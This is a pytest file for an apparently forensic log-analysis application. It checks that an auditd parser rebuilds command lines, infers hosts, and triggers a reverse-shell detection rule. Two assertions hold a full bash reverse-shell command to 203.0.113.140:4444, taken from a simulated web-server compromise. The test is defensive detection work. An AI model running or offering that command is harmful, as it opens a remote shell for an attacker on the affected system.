import uuid
from pathlib import Path

from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from app.main import app as fastapi_app
from app.core.dependencies import get_current_user
from app.core.security import hash_password
from app.db.base import Base
import app.db.models  # noqa: F401
from app.db.models.case import Case, CaseStatus
from app.db.models.user import User, UserRole
from app.db.session import get_db
from app.api.v1 import evidence as evidence_module
from app.parsers.auditd import AuditdParser
from app.services.detection_engine import execute_detections_on_events
from app.services.normalizer import normalize_records


WEB_COMPROMISE_DIR = (
    Path(__file__).resolve().parents[1] / "test_evidence" / "web_server_compromise"
)


def test_auditd_parser_uid_cmdline_node_and_reverse_shell(tmp_path):
    audit_path = WEB_COMPROMISE_DIR / "03_auditd.log"
    assert audit_path.is_file(), f"Missing fixture: {audit_path}"

    records = AuditdParser().parse(audit_path, original_filename="03_auditd.log")
    assert len(records) == 18

    normalized = normalize_records(records, default_filename="03_auditd.log")
    assert len(normalized) == 18

    # First 7 records are uid=33 webshell commands; remaining 11 are uid=0 root commands
    for rec in normalized[:7]:
        assert rec["details"]["user"] == "uid=33"
        assert rec["details"]["host"] == "unknown_host"
        assert rec["details"]["host_inferred"] is True
    for rec in normalized[7:]:
        assert rec["details"]["user"] == "root"
        assert rec["details"]["host"] == "unknown_host"
        assert rec["details"]["host_inferred"] is True

    # user must never be the command name or unset auid sentinel
    users = {rec["details"]["user"] for rec in normalized}
    assert users == {"uid=33", "root"}
    assert not (users & {"bash", "scp", "useradd", "mysqldump", "4294967295"})

    # All EXECVE args a0..aN must be reconstructed despite argc=1
    rev_shell_rec = next(
        rec for rec in normalized
        if "/dev/tcp/203.0.113.140/4444" in str(rec["details"].get("command_line") or "")
    )
    assert rev_shell_rec["details"]["command_line"] == "bash -c bash -i >& /dev/tcp/203.0.113.140/4444 0>&1"
    assert rev_shell_rec["details"]["user"] == "uid=33"

    # Reverse-shell detection fires on the parsed event
    event_objs = [
        {"id": f"aud-{i}", "timestamp": rec["timestamp"], "event_type": rec["event_type"], "source": rec["source"], "details": rec["details"]}
        for i, rec in enumerate(normalized)
    ]
    findings = execute_detections_on_events(event_objs, uuid.uuid4())
    rev_findings = [f for f in findings if f.get("rule_id") == "rule-reverse-shell-pattern" or f.get("mitre_technique") == "T1059.004"]
    assert len(rev_findings) >= 1
    matched_ids = {eid for f in rev_findings for eid in f.get("matching_event_ids", [])}
    rev_idx = normalized.index(rev_shell_rec)
    assert f"aud-{rev_idx}" in matched_ids

    # node= in auditd log must be used directly as non-inferred host
    node_log = tmp_path / "node_audit.log"
    node_log.write_text(
        'type=SYSCALL msg=audit(1784684652.000:9001): arch=c000003e syscall=59 success=yes uid=33 auid=4294967295 node=DB-01 comm="id" exe="/usr/bin/id"\n'
        'type=EXECVE msg=audit(1784684652.000:9001): argc=1 a0="id"\n',
        encoding="utf-8",
    )
    node_records = AuditdParser().parse(node_log)
    assert len(node_records) == 1
    assert node_records[0]["host"] == "DB-01"
    assert node_records[0]["host_inferred"] is False
    assert node_records[0]["user"] == "uid=33"


def test_auditd_single_host_case_inference_and_multi_host_fallback(tmp_path, monkeypatch):
    audit_path = WEB_COMPROMISE_DIR / "03_auditd.log"
    auth_path = WEB_COMPROMISE_DIR / "02_auth.log"
    assert audit_path.is_file() and auth_path.is_file()

    test_db = tmp_path / "auditd_test.sqlite"
    engine = create_engine(f"sqlite:///{test_db}", connect_args={"check_same_thread": False})
    Base.metadata.create_all(bind=engine)
    TestSession = sessionmaker(bind=engine, autoflush=False, autocommit=False)

    upload_dir = tmp_path / "evidence_uploads"
    upload_dir.mkdir(parents=True, exist_ok=True)
    monkeypatch.setattr(evidence_module, "UPLOAD_DIR", upload_dir)

    db = TestSession()
    user = User(
        username=f"inv_{uuid.uuid4().hex[:8]}",
        email=f"inv_{uuid.uuid4().hex[:8]}@dcsre.test",
        hashed_password=hash_password("Investigator#2026"),
        role=UserRole.INVESTIGATOR,
        is_active=True,
    )
    db.add(user)
    db.flush()

    single_case = Case(name="Auditd Single Host", description="Single host", status=CaseStatus.OPEN, created_by=user.id)
    multi_case = Case(name="Auditd Multi Host", description="Multi host", status=CaseStatus.OPEN, created_by=user.id)
    db.add_all([single_case, multi_case])
    db.commit()

    def override_get_db():
        session = TestSession()
        try:
            yield session
        finally:
            session.close()

    prev_db = fastapi_app.dependency_overrides.get(get_db)
    prev_user = fastapi_app.dependency_overrides.get(get_current_user)
    fastapi_app.dependency_overrides[get_db] = override_get_db
    fastapi_app.dependency_overrides[get_current_user] = lambda: user

    try:
        client = TestClient(fastapi_app)

        # Single-host case (02_auth.log -> WEB-01): 03_auditd.log infers WEB-01 with host_inferred=True
        with auth_path.open("rb") as fh:
            assert client.post(
                f"/api/v1/evidence/cases/{single_case.id}/evidence/upload",
                files={"file": ("02_auth.log", fh, "text/plain")},
                data={"description": "auth"},
            ).status_code == 201
        with audit_path.open("rb") as fh:
            assert client.post(
                f"/api/v1/evidence/cases/{single_case.id}/evidence/upload",
                files={"file": ("03_auditd.log", fh, "text/plain")},
                data={"description": "auditd"},
            ).status_code == 201

        single_events = [
            e for e in client.get(f"/api/v1/events/cases/{single_case.id}/events").json()
            if e.get("event_type") == "auditd"
        ]
        assert len(single_events) == 18
        assert all(e["host"] == "WEB-01" and e["host_inferred"] is True for e in single_events)
        assert single_events[4]["user"] == "uid=33"
        assert single_events[4]["command_line"] == "bash -c bash -i >& /dev/tcp/203.0.113.140/4444 0>&1"
        assert single_events[8]["user"] == "root"

        # Multi-host case (WEB-01 + DB-01): 03_auditd.log must remain unknown_host
        two_hosts_log = (
            "2026-07-22T01:00:00Z WEB-01 app action=start\n"
            "2026-07-22T01:00:05Z DB-01 app action=start\n"
        ).encode("utf-8")
        assert client.post(
            f"/api/v1/evidence/cases/{multi_case.id}/evidence/upload",
            files={"file": ("hosts.log", two_hosts_log, "text/plain")},
            data={"description": "two hosts"},
        ).status_code == 201
        with audit_path.open("rb") as fh:
            assert client.post(
                f"/api/v1/evidence/cases/{multi_case.id}/evidence/upload",
                files={"file": ("03_auditd.log", fh, "text/plain")},
                data={"description": "auditd"},
            ).status_code == 201

        multi_events = [
            e for e in client.get(f"/api/v1/events/cases/{multi_case.id}/events").json()
            if e.get("event_type") == "auditd"
        ]
        assert len(multi_events) == 18
        assert all(e["host"] == "unknown_host" and e["host_inferred"] is True for e in multi_events)
    finally:
        if prev_db is not None:
            fastapi_app.dependency_overrides[get_db] = prev_db
        else:
            fastapi_app.dependency_overrides.pop(get_db, None)
        if prev_user is not None:
            fastapi_app.dependency_overrides[get_current_user] = prev_user
        else:
            fastapi_app.dependency_overrides.pop(get_current_user, None)
        db.close()
        engine.dispose()
